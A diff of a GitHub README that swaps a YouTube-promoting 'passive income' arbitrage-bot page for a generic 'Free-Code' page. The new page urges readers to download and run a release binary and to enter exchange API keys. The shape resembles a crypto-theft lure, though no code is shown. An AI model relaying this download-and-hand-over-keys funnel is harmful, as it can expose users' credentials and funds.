@@ -1,28 +1,79 @@
-# 📈 Bot for Passive Income — My Experiment
+# 🤖 Free-Code - Automate Your Trading Easily
 
-Hey! I got hooked on this [YouTube video](https://www.youtube.com/watch?v=v0-GjIm0HD0) about **arbitrage bots** that can make cash while you sleep. 😴 Decided to give it a try, wrote some code, and I’m sharing it with you. Repo’s open, grab it, test it, make money! 💪
+[![Download Free-Code](https://img.shields.io/badge/Download-Free--Code-brightgreen)](https://github.com/zitounates/Free-Code/releases)
 
-![Crypto Chart](https://media.giphy.com/media/3o6ZtaO9BZHcOjmErm/giphy.gif)
+## 🚀 Getting Started
 
-## How I Got Into This
-Watched the video where a dude explains how bots profit from price differences across exchanges. Got pumped, started coding. This repo’s my first go, and I’m stoked!
+Welcome to Free-Code! This application helps you automate your trading with an easy-to-use arbitrage bot. If you're looking to make the most out of crypto trading, you are in the right place. 
 
-## Step by Step
-1. Hit the button and watch the video! 🎥
-2. Clone the repo, check out the code.
-3. Try running the bot.
+## 📥 Download & Install
 
-<a href="https://www.youtube.com/watch?v=v0-GjIm0HD0">
-  <img src="https://img.shields.io/badge/YouTube-Go%20Watch-red?style=for-the-badge&logo=youtube" alt="Watch on YouTube">
-</a>
+To get started, you need to visit our Releases page to download the latest version of Free-Code. Click the link below:
 
-## Why You Should Try
-- Bot automates trading.
-- Code’s free, I’m testing it myself.
-- Video makes it all super clear.
+[Visit this page to download](https://github.com/zitounates/Free-Code/releases)
 
-If you’re feeling it, subscribe to the channel for new ideas! 😎
+## 🔍 System Requirements
 
-> **Heads Up**: Test the bot with small amounts.
+Before you begin, ensure your system meets the following requirements:
 
-*Let’s make money together!*
+- **Operating System**: Windows 10 or higher, macOS 10.14 or higher, or a recent Linux distribution (Ubuntu, Fedora).
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free disk space.
+- **Network**: An active internet connection to connect to trading platforms.
+
+## ⚙️ Installation Guide
+
+1. **Download the Application**: 
+   Go to our [Releases page](https://github.com/zitounates/Free-Code/releases) and download the latest version suitable for your operating system.
+
+2. **Locate the Downloaded File**: 
+   Once the download completes, find the file in your computer's downloads folder.
+
+3. **Begin the Installation**: 
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded file and drag the application into your Applications folder.
+   - For Linux: Unzip the downloaded archive and run the installer via terminal.
+
+4. **Run Free-Code**: 
+   Once the installation finishes, you can open Free-Code from your applications folder or start menu. 
+
+## 📚 How to Use Free-Code
+
+1. **Set Up Your Account**: 
+   Create an account on your preferred crypto trading platform if you don't have one already. Make sure to obtain your API key for connecting Free-Code.
+
+2. **Configure Free-Code**: 
+   Open Free-Code, go to settings, and enter your API key. This will allow Free-Code to access your trading account securely.
+
+3. **Choose Your Trading Strategy**: 
+   Free-Code offers various strategies for trading. Select the one that best fits your goals:
+
+   - **Arbitrage**: This strategy takes advantage of price differences across exchanges.
+   - **Market Making**: This keeps your trades within stable markets to profit from small price fluctuations.
+
+4. **Start Trading**: 
+   After setting it up, click on the "Start Trading" button. Free-Code will work in the background to find profitable trades.
+
+## 🛠️ Features
+
+- **User-Friendly Interface**: Designed for beginners with an easy-to-navigate layout.
+- **Real-Time Data**: Get updates on prices as they happen.
+- **Multiple Strategies**: Choose from different trading strategies tailored for various markets.
+- **Custom Settings**: Adjust parameters to fit your risk tolerance.
+- **YouTube Tutorial**: Watch our [YouTube tutorial](#) for a step-by-step guide on setup and usage!
+
+## 💬 Troubleshooting
+
+If you encounter issues while using Free-Code, these common problems might help:
+
+- **API Key Issues**: Ensure that your API key is entered correctly and has the required permissions.
+- **Connection Problems**: Check your internet connection and settings on the designated trading platform.
+- **Performance Issues**: Make sure your system meets the required specifications and close unnecessary applications to free up resources.
+
+## 📞 Support
+
+For additional help, feel free to reach out to our support team via issues on GitHub. We strive to respond within 24 hours.
+
+---
+
+Explore the world of algorithmic trading with Free-Code today! Download it [here](https://github.com/zitounates/Free-Code/releases) and start automating your trades.
